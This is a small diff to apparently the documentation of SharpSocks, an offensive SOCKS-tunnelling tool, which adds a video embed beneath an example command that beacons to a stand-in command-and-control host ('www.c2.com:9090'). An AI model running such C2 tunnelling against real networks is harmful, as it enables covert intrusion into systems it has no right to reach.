@@ -24,3 +24,4 @@ EXAMPLES
 
 	SharpSocks -Uri "http://www.c2.com:9090" -Beacon 2000 -Insecure
 		
+.. embed:: https://www.youtube.com/watch?v=-p_hAgmM90k
